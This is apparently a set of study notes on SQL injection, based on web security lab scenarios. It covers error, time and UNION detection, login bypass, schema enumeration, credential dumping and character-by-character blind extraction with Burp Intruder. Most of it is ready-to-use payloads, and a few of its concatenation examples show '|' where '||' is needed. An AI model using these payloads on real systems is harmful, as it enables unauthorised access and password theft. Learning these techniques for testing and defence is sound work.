SQL injection
---
#### What is SQL injection ?
SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve.

---
#### Detect SQL injection vulnerabilities
###### Classic Error-Based Detection
- Submit a single quote (`'`) or double quote (`"`) in input fields
- Look for database error messages (MySQL, PostgreSQL, SQL Server, Oracle syntax)
- Try boolean conditions: `1=1` (true) vs `1=2` (false) and compare responses
###### Time Based Detection
- MySQL: `' OR SLEEP(5)--`
- PostgreSQL: `'; SELECT pg_sleep(5)--`
- SQL Server: `'; WAITFOR DELAY '00:00:05'--`
- If the response delays ~5 seconds, the injection exists

###### Union Based  Detection 
- `' UNION SELECT NULL--`
- `' UNION SELECT NULL,NULL--` (increment columns until no error)
- Then extract data: `' UNION SELECT username,password FROM users--`
---

#### Retrieving Hidden Data
**Normal query:**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Attack 1 — Show unreleased products:**
```
https://insecure-website.com/products?category=Gifts'--
```
Resulting query:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
`--` is a comment indicator. The rest of the query is interpreted as a comment, removing `AND released = 1`. All products are displayed, including unreleased ones.

**Attack 2 — Show all products in any category:**
```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
Resulting query:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
`1=1` is always true. The query returns all items.

**Warning:** `OR 1=1` can reach `UPDATE` or `DELETE` statements in the same request, causing accidental data loss.

---
#### Subverting Application Logic 
**Scenario:** An application lets users log in with a username and password.

**Normal query:**

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

**Attack — Log in as any user without a password:**
An attacker can do this using the SQL comment sequence `--` to remove the password check from the `WHERE` clause.

- Username: `administrator'--`
- Password: _(blank)_

Resulting query:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

`--` is a comment indicator. The rest of the query is interpreted as a comment, removing `AND password = ''`. The query returns the user whose username is `administrator` and successfully logs the attacker in as that user.

---
#### SQL Injection UNION Attacks

**Definition:** When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.
The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query. For example:     

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

This SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

---

#### Requirements for UNION to Work

Two key requirements must be met:

1. The individual queries must return the **same number of columns**.
2. The **data types** in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

---

## Determining the Number of Columns

### Method 1: ORDER BY

Inject a series of `ORDER BY` clauses and increment the column index until an error occurs:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

The column in an `ORDER BY` clause can be specified by its index. When the specified column index exceeds the number of actual columns, the database returns an error, such as:

> The ORDER BY position number 3 is out of range of the number of items in the select list.

The application might return the database error, a generic error, or no results. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned.

#### Method 2: UNION SELECT with NULLs

Submit a series of `UNION SELECT` payloads with different numbers of null values:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

If the number of nulls does not match the number of columns, the database returns an error, such as:

> All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

`NULL` is used because it is convertible to every common data type, maximizing the chance of success when the column count is correct.
When the number of nulls matches the number of columns, the database returns an additional row containing null values. The effect on the HTTP response depends on the application's code — you might see extra content, a different error, or no visible change.

---

#### Database-Specific Syntax

**Oracle:** Every `SELECT` query must use `FROM` and specify a valid table. Use the built-in `dual` table:
```sql
' UNION SELECT NULL FROM DUAL--
```

**MySQL:** The double-dash `--` must be followed by a space. Alternatively, use `#` for comments.

---

## Finding String-Compatible Columns

Interesting data is normally in string form. After determining the number of columns, probe each column by placing a string value into each in turn:

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

If the data type is incompatible, the database returns an error, such as:

> Conversion failed when converting the varchar value 'a' to data type int.

If no error occurs and the response contains the injected string, that column is suitable for retrieving string data.

---
## Enumerating the Database Schema

Once you know the column count and which positions accept strings, you can query the database's metadata to map out tables and columns.

### Database-Specific Metadata Tables

|Database|Table Catalog|Column Catalog|
|:--|:--|:--|
|MySQL|`information_schema.tables`|`information_schema.columns`|
|PostgreSQL|`information_schema.tables`|`information_schema.columns`|
|Microsoft SQL Server|`information_schema.tables`|`information_schema.columns`|
|Oracle|`all_tables`|`all_tab_columns`|

---

### Finding Tables

Query the metadata to list all user-accessible tables:

**MySQL / PostgreSQL / SQL Server:**

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
```

**Oracle:**

```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

**Result:** Returns a list of tables such as:

- `users`
- `products`
- `orders`
- `admin`

If only one string-compatible column is available, concatenate results using `GROUP_CONCAT()` (MySQL), `STRING_AGG()` (PostgreSQL/SQL Server), or `LISTAGG()` (Oracle):

**MySQL:**

```sql
' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
```

---

### Finding Columns in a Target Table

Once a table of interest is identified (e.g., `users`), enumerate its columns:

**MySQL / PostgreSQL / SQL Server:**

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Oracle:**

```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

**Result:** The `users` table contains columns such as:
- `username`
- `password`
- `email`
If you need both column names and their data types in one query:

**MySQL:**

```sql
' UNION SELECT CONCAT(column_name,':',data_type),NULL FROM information_schema.columns WHERE table_name='users'--
```

---

## Extracting Data

With the table and column names known, dump the actual data through the string-compatible column positions.

### Basic Data Extraction

**MySQL / PostgreSQL / SQL Server:**

```sql
' UNION SELECT username,password FROM users--
```

**Oracle:**

```sql
' UNION SELECT username,password FROM users--
```

**Result:** The response now contains actual credentials:

- `admin : 5f4dcc3b5aa765d61d8327deb882cf99`
- `john : 202cb962ac59075b964b07152d234b70`
---
### String Concatenation (Join values from the same row)

| Database        | Function                   | Payload Example                                                                                                   |     |
| :-------------- | :------------------------- | :---------------------------------------------------------------------------------------------------------------- | --- |
| **MySQL**       | `CONCAT(a, b, c)`          | `' UNION SELECT CONCAT(table_name, '::', column_name) FROM information_schema.columns WHERE table_name='users'--` |     |
| **MySQL** (alt) | `CONCAT_WS(sep, a, b)`     | `' UNION SELECT CONCAT_WS(':', table_name, column_name, data_type) FROM information_schema.columns--`             |     |
| **PostgreSQL**  | `CONCAT(a, b)` or `\|`     | `' UNION SELECT table_name \| '::' \| column_name FROM information_schema.columns WHERE table_name='users'--`     |     |
| **SQL Server**  | `+` operator or `CONCAT()` | `' UNION SELECT table_name + '::' + column_name FROM information_schema.columns WHERE table_name='users'--`       |     |
| **Oracle**      | `\|` operator              | `' UNION SELECT table_name\|'::'\|column_name FROM all_tab_columns WHERE table_name='USERS'--`                    |     |
| **SQLite**      | `\|` operator              | `' UNION SELECT table_name \| '::' \| name FROM pragma_table_info('users')--`                                     |     |

---
## Querying the Database Type and Version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works.

### Version Queries by Database Type

|Database Type|Query|
|:--|:--|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|


### Example UNION Attack

```sql
' UNION SELECT @@version--
```

This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:

>Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)  
>Mar 18 2018 09:11:49  
>Copyright (c) Microsoft Corporation  
>Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 X64

---
## Blind SQL Injection

Blind SQL Injection is a web security vulnerability where an attacker injects malicious SQL payloads and infers database contents by observing **differences in application behavior** — such as the presence/absence of page content, response time delays, or HTTP status codes — rather than viewing query results directly. The application never returns raw SQL output in the response.
Two sub-types exist:

- **Boolean-based**: True/false conditions cause visible page differences (e.g., a "Welcome back" message appears or disappears)
- **Time-based**: True/false conditions cause measurable time delays (e.g., `SLEEP(5)`)
---
### Exploitation Workflow (Lab Scenario)

**Scenario:** An e-commerce site uses a `TrackingId` cookie for analytics. The backend executes:

```sql
SELECT * FROM tracking WHERE id = '[cookie-value]'
```

The query results are never displayed. No error messages are shown. The only observable difference is that if the query returns any rows, the page includes **"Welcome back"**; if zero rows, the message is absent. A separate table `users` exists with columns `username` and `password`.

---

### Step 1: Confirm the Injection Point

Force true and false states to verify the parameter is injectable.

```sql
TrackingId=xyz' AND '1'='1'-- 
```

- Full query: `SELECT * FROM tracking WHERE id = 'xyz' AND '1'='1'`
- Condition is **TRUE** → query returns rows → **"Welcome back" appears**

```sql
TrackingId=xyz' AND '1'='2'-- 
```

- Full query: `SELECT * FROM tracking WHERE id = 'xyz' AND '1'='2'`
- Condition is **FALSE** → query returns zero rows → **"Welcome back" absent**

**Inference:** The cookie is injectable. The presence/absence of "Welcome back" serves as the boolean oracle.

---

### Step 2: Confirm the Target Schema Exists

Use the oracle to ask yes/no questions about the database structure.

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'-- 
```

- Subquery selects `'a'` from the `users` table. If the table exists, it returns `'a'` → `'a'='a'` is **TRUE**
- **"Welcome back" appears** → confirms `users` table exists

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'-- 
```

- Subquery selects `'a'` where `username='administrator'`. If that user exists, returns `'a'` → condition is **TRUE**
- **"Welcome back" appears** → confirms `administrator` user exists

---

### Step 3: Determine Password Length

Increment a length check until the condition fails.

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'-- 
...
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'-- 
```

When `>20` returns no message, the password is **exactly 20 characters** long.

---

### Step 4: Extract the Password Character-by-Character

Use `SUBSTRING()` inside a subquery to isolate a single character position and brute-force its value against the oracle.

**Payload:**

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'-- 
```

**Dissection:**

|Segment|Role|
|:--|:--|
|`xyz'`|Closes the original string literal in the query|
|`AND`|Appends a second boolean condition to the `WHERE` clause|
|`(SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')`|**Subquery**: queries the `users` table, filters to the `administrator` row, and uses `SUBSTRING(password,1,1)` to extract exactly **1 character starting at position 1** from the `password` column|
|`='a'`|Compares that extracted single character against the candidate value `'a'`|
|`--`|Comments out any remaining trailing SQL syntax to prevent errors|

**How `SUBSTRING(password,1,1)` functions in this context:**

- The 1st argument `password` is the column being sliced
- The 2nd argument `1` tells the database to start at the **first character** of that password string
- The 3rd argument `1` tells it to extract only **one character** in length
- Result: if the password is `p4ssw0rd...`, this returns `'p'` for position 1

To test the second character, the payload becomes:

```sql
... SUBSTRING(password,2,1) ...='a'-- 
```

Here `SUBSTRING(password,2,1)` starts at position 2 and extracts 1 character. If the password is `p4ssw0rd...`, this returns `'4'`.

**The brute-force process:**

- `SUBSTRING(password,1,1)='a'` → no message → not 'a'
- `SUBSTRING(password,1,1)='b'` → no message → not 'b'
- `SUBSTRING(password,1,1)='p'` → **"Welcome back"** → 1st character is `'p'`

Repeat for positions 1 through 20, testing characters `a-z` and `0-9` at each position.

**Automation with Burp Intruder:**

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'-- 
```

|Payload Set|Values|Purpose|
|:--|:--|:--|
|Position marker|`1` through `20`|Which password character to test|
|Character marker|`a-z`, `0-9`|Candidate value to compare against|

**Total requests:** 20 positions × 36 characters = **720 requests**

---

### Step 5: Interpret the Oracle and Reconstruct the Password

|Subquery Result|Condition|Query Returns|Page Behavior|Meaning|
|:--|:--|:--|:--|:--|
|Character matches|`='a'` is TRUE|Rows|"Welcome back" visible|That character at that position is correct|
|Character differs|`='a'` is FALSE|Zero rows|No message|That character is incorrect|

After Intruder completes, collect every character that produced a "Welcome back" match for each of the 20 positions. Concatenate them to form the full password.

---

### Step 6: Log In as Administrator

Navigate to **My account**, enter:

- **Username:** `administrator`
- **Password:** `[the 20-character string extracted via SUBSTRING brute-forcing]`

---

### Database-Specific SUBSTRING Syntax

| Database             | Function                   | Example                   |
| :------------------- | :------------------------- | :------------------------ |
| MySQL                | `SUBSTRING()` / `SUBSTR()` | `SUBSTRING(password,1,1)` |
| PostgreSQL           | `SUBSTRING()` / `SUBSTR()` | `SUBSTRING(password,1,1)` |
| Microsoft SQL Server | `SUBSTRING()`              | `SUBSTRING(password,1,1)` |
| Oracle               | `SUBSTR()`                 | `SUBSTR(password,1,1)`    |
